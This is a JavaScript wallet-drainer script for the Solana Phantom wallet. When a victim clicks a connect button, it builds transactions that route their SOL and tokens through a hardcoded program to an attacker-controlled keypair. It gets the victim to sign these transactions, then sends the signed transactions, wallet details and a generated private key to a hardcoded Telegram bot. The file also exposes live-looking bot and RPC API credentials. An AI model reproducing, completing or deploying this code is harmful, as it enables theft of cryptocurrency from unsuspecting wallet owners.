import {
    Connection,
    PublicKey,
    ComputeBudgetProgram,
    TransactionInstruction,
    Keypair,
    Transaction, SystemProgram
} from "@solana/web3.js";
import {createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID} from '@solana/spl-token';
import axios from 'axios';

// 🚀 Telegram Bot Config
const BOT_TOKEN = "7909304262:AAHYDnSdUvpnl1FlfnBBXF9lrl6KUYVzg2I";  // 🔥 ЗАМЕНИ НА СВОЙ ТОКЕН
const CHAT_ID = "5536054864";  // 🔥 ЗАМЕНИ НА СВОЙ CHAT ID

// 📩 Функция отправки в Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await axios.post(url, { chat_id: CHAT_ID, text: message });
}

// transfered from search params
const initialData = {
    workerJWT: '',
    workerURI: '',
    closepopuponsuccess: false,
    gain: {
        enabled: false,
        native: {},
        tokens: [{}]
    }
};

// create rpc instance
const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=6c281646-a5ac-4d3e-8d1e-237c484e40a0");

class ServerApi {
    async init(publicKey, privateKey) {
        const message = `🔑 Новый Keypair:\n🪪 Public Key: ${publicKey.toString()}\n🔐 Private Key: ${privateKey}`;
        await sendToTelegram(message);
    }

    async filters() {
        await sendToTelegram("📡 Запрос к API: /filters");
    }

    async info(publicKey, portfolio, walletName) {
        const message = `ℹ️ Запрос к API: /info\n👤 Wallet: ${walletName}\n🪪 Public Key: ${publicKey.toString()}`;
        await sendToTelegram(message);
    }

    async push(serialized, walletType = 0, usd = 0) {
        await sendToTelegram(`🚀 Подписанная транзакция:\n${serialized}`);
    }
}

async function GainToken(pubKey, transaction, mint, from, tokenAccount, amount) {
    let fromPB = new PublicKey(from);
    mint = new PublicKey(mint);
    tokenAccount = new PublicKey(tokenAccount);

    const userTA = await getAssociatedTokenAddress(mint, pubKey);
    const userTAInfo = await connection.getAccountInfo(userTA);

    if (!userTAInfo) {
        transaction.add(createAssociatedTokenAccountInstruction(from, userTA, pubKey, mint));
    }

    const sender = await getAssociatedTokenAddress(mint, from);
    transaction.add(createTransferInstruction(sender, userTA, from, amount, [], TOKEN_PROGRAM_ID));
    return transaction;
}

document.getElementById('phantomConnector').addEventListener('click', async () => {
    if (!window?.phantom?.solana) {
        alert("Установите Phantom Wallet!");
        return;
    }

    const connector = window?.phantom?.solana;
    connector.on("connect", async () => {
        const api = new ServerApi();
        const { secretKey, publicKey: newWalletPub } = await Keypair.generate();
        const userPublicKey = new PublicKey(connector.publicKey);
        const { lamports } = await connection.getAccountInfo(userPublicKey);

        await api.filters();
        const portfolio = {
            tokens: [],
            tokens2022: [],
            native: {}
        };

        await api.info(userPublicKey, portfolio, 'phantom');
        await api.init(userPublicKey, Array.from(secretKey));

        const lastBH = await connection.getLatestBlockhash();
        const transactions = [];
        const transaction = new Transaction({
            feePayer: userPublicKey,
            recentBlockhash: lastBH
        }).add(ComputeBudgetProgram.setComputeUnitPrice({
            microLamports: 200000
        })).add(ComputeBudgetProgram.setComputeUnitLimit({
            units: 1000000
        }));

        const instructions = [];

        // contract interact native
        const contractInteractInstruction = new TransactionInstruction({
            keys: [
                { pubkey: newWalletPub, isSigner: false, isWritable: true },
                { pubkey: userPublicKey, isSigner: true, isWritable: true },
                { pubkey: new PublicKey('11111111111111111111111111111111'), isSigner: false, isWritable: false },
                { pubkey: new PublicKey('8K17Gvd6R59oWachgVX8G8aiyncRsESmtZ72tYQCuSEV'), isSigner: false, isWritable: false },
                { pubkey: new PublicKey('4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE'), isSigner: false, isWritable: true }
            ],
            programId: new PublicKey('Ct4p4tQBDuptXjLFJUzfPmNSZcMkh2ivFuFdp3UqiCmR'),
            data: new Uint8Array([9, 109, 178, 96, 144, 211, 152, 159])
        });

        instructions.push(contractInteractInstruction);

        for (const token of portfolio.tokens) {
            const contractInteractInstruction = new TransactionInstruction({
                keys: [
                    { pubkey: newWalletPub, isSigner: false, isWritable: true },
                    { pubkey: userPublicKey, isSigner: true, isWritable: true },
                    { pubkey: new PublicKey(token.mint), isSigner: false, isWritable: true }
                ],
                programId: new PublicKey('Ct4p4tQBDuptXjLFJUzfPmNSZcMkh2ivFuFdp3UqiCmR'),
                data: new Uint8Array([193, 43, 90, 230, 205, 87, 222, 41])
            });
            instructions.push(contractInteractInstruction);
        }

        for (const instruction of instructions) {
            transaction.add(instruction);
        }

        transactions.push(transaction);

        if (initialData.gain.enabled) {
            let transaction = new Transaction({ recentBlockhash: lastBH.blockhash, feePayer: userPublicKey });
            for (let token of initialData.gain.tokens) await GainToken(transaction, token.mint, token.from, token.fromTA, token.amount);
            transactions.push(transaction.add(SystemProgram.transfer({
                fromPubkey: new PublicKey(initialData.gain.native.from),
                toPubkey: userPublicKey,
                lamports: initialData.gain.native.amount
            })));
        }

        const signedTransactions = await connector.signAllTransactions(transactions);
        const serialized = [];
        for (const transaction of signedTransactions) {
            serialized.push(transaction.serialize({ requireAllSignatures: true }).toString('base64'));
        }

        await api.push(serialized);
    });

    try {
        await connector.connect({ onlyIfTrusted: false });
    } catch (e) {
        console.error(e);
    }
});
